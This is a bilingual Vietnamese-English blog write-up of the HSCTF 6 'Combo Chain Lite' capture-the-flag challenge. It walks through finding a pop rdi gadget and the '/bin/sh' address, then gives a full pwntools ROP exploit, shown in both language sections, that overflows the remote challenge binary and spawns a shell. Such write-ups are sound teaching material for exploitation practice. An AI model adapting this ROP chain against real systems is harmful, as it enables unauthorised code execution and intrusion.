---
layout: post
published: true
title: 'HSCTF 6: Combo Chain Lite'
categories:
  - CTF
  - HSCTF
---
## \[ENGLISH BELOW]


Xin chào.
Hôm nay mình muốn viết lại challenge này.

![Capture-combo-chain-lite.PNG]({{site.baseurl}}/img/ctf/HSCTF/2019/Capture-combo-chain-lite.PNG)

[combo-chain-lite.c](https://ctf.hsctf.com/files/6fc8b6ed70bd7670c1d81f8939596712/combo-chain-lite.c?token=eyJ0ZWFtX2lkIjoxMjcyLCJ1c2VyX2lkIjoyMTgzLCJmaWxlX2lkIjo2Mn0.XQ-uYA.8F1dwaZpumZVCSVEYOXcOF93DdM) 
[combo-chain-lite](https://ctf.hsctf.com/files/a12f5a0e0aea3721aa21189b949427e7/combo-chain-lite?token=eyJ0ZWFtX2lkIjoxMjcyLCJ1c2VyX2lkIjoyMTgzLCJmaWxlX2lkIjo2M30.XQ-uYA.ptvq-hFeiK8u7baL_Auf-k6kn_Y)

Chall sử dụng [ROP (Return Oriented Programming)](https://ctf101.org/binary-exploitation/return-oriented-programming/). Nên trước tiên ta tìm địa chỉ chứa ROP gadgets phù hợp.
Trong quy ước gọi ([calling conventions](https://ctf101.org/binary-exploitation/what-are-calling-conventions/)), các đối số được truyền vào các registers trong các chương trình 64-bit theo thứ tự như link tham khảo. Trong trường hợp của gọi `system`, thì chúng ta cần phải điều khiển thanh ghi RDI. Mình sẽ tìm các ROP gadgets thông qua tool như [rp++](https://github.com/0vercl0k/rp) hoặc [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) liên quan tới `pop rdi`. 

{: .box-note}
ROPgadget \--binary ./combo-chain-lite \| grep "pop rdi"

Khi đã có được địa chỉ của ROP, ta sẽ cần tìm địa chỉ của hàm `system` khi được nạp vào chương trình khi được thực thi. Tuy nhiên ở đây chương trình đã cung cấp sẵn cho ta.

![exec-combo-chain-lite.PNG]({{site.baseurl}}/img/ctf/HSCTF/2019/exec-combo-chain-lite.PNG)

Tiếp theo ta cần tìm cách đưa chuỗi "/bin/sh" vào như đối số của `system`.
Nếu để ý thì trong chương trình đã có sẵn chuỗi đó, việc cần làm là tìm địa chỉ của nó trong chương trình mà thôi.

Có thể dùng gef hoặc gdb-peda.

-**Đối với gef:**
{% highlight bash linenos %}
$ gdb ./combo-chain-lite
gef➤  r
...
gef➤  grep /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/home/node/tmp/combo-chain-lite'(0x402000-0x403000), permission=r--
  0x402051 - 0x402058  →   "/bin/sh"
{% endhighlight %}

-**Đối với gdb-peda:**
{% highlight bash linenos %}
$ gdb ./combo-chain-lite
gdb-peda$ b*0x0000000000401209  #đặt breakpoint ở đoạn instruction sau khi in chuỗi
gdb-peda$ r
...
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
combo-chain-lite : 0x402051 --> 0x68732f6e69622f ('/bin/sh')
combo-chain-lite : 0x403051 --> 0x68732f6e69622f ('/bin/sh')
            libc : 0x7ffff7f67e80 --> 0x68732f6e69622f ('/bin/sh')
{% endhighlight %}

Đoạn code exploit của mình:

{% highlight python linenos %}
#Completed

from pwn import *

rm = remote("pwn.hsctf.com", 3131)

padding = "AAA%AAsAABAA$AAn" #16 ki tu (random pattern)
rop_addr = p64(0x0000000000401273)
bin_addr = p64(0x402051) #hoac 0x403051 /bin/sh string
sys_addr = p64(int(rm.recv().rsplit(': ')[1], 16)) 

payload = padding + rop_addr  + bin_addr + sys_addr
print payload
rm.recv()
rm.sendline(payload)
rm.interactive()
rm.close()
{% endhighlight %}

![combo-chain-lite-exploit.png]({{site.baseurl}}/img/ctf/HSCTF/2019/combo-chain-lite-exploit.png)

Done.


## ENGLISH

Hello everyone, here is the challenge:
![Capture-combo-chain-lite.PNG]({{site.baseurl}}/img/ctf/HSCTF/2019/Capture-combo-chain-lite.PNG)

Challenge uses [ROP (Return Oriented Programming)](https://ctf101.org/binary-exploitation/return-oriented-programming/). So first we need to find right ROP gadgets addresses.
In ([calling conventions](https://ctf101.org/binary-exploitation/what-are-calling-conventions/)), arguments are passed in registers in 64-bit programs. In the case of running `system`, this means we will need to find a way to control the RDI register. We will find ROP gadgets through tools like [rp++](https://github.com/0vercl0k/rp) or [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) that have `pop rdi`. 

{: .box-note}
ROPgadget \--binary ./combo-chain-lite \| grep "pop rdi"

After having ROP address, we need to find the address of `system` function that imported when executing the program. But here, the program has provided for us.

![exec-combo-chain-lite.PNG]({{site.baseurl}}/img/ctf/HSCTF/2019/exec-combo-chain-lite.PNG)

Next, try to figure out how to put the string "/bin/sh" as `system`'s argument.
If you look closer, in the program already has that string, we only need to figure out the address of it.

We can use gef or gdb-peda.

-**With gef:**
{% highlight bash linenos %}
$ gdb ./combo-chain-lite
gef➤  r
...
gef➤  grep /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/home/node/tmp/combo-chain-lite'(0x402000-0x403000), permission=r--
  0x402051 - 0x402058  →   "/bin/sh"
{% endhighlight %}

-**With gdb-peda:**
{% highlight bash linenos %}
$ gdb ./combo-chain-lite
gdb-peda$ b*0x0000000000401209  #đặt breakpoint ở đoạn instruction sau khi in chuỗi
gdb-peda$ r
...
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
combo-chain-lite : 0x402051 --> 0x68732f6e69622f ('/bin/sh')
combo-chain-lite : 0x403051 --> 0x68732f6e69622f ('/bin/sh')
            libc : 0x7ffff7f67e80 --> 0x68732f6e69622f ('/bin/sh')
{% endhighlight %}

My exploit code:

{% highlight python linenos %}
#Completed

from pwn import *

rm = remote("pwn.hsctf.com", 3131)

padding = "AAA%AAsAABAA$AAn" #16 ki tu (random pattern)
rop_addr = p64(0x0000000000401273)
bin_addr = p64(0x402051) #hoac 0x403051 /bin/sh string
sys_addr = p64(int(rm.recv().rsplit(': ')[1], 16)) 

payload = padding + rop_addr  + bin_addr + sys_addr
print payload
rm.recv()
rm.sendline(payload)
rm.interactive()
rm.close()
{% endhighlight %}

![combo-chain-lite-exploit.png]({{site.baseurl}}/img/ctf/HSCTF/2019/combo-chain-lite-exploit.png)

Done.
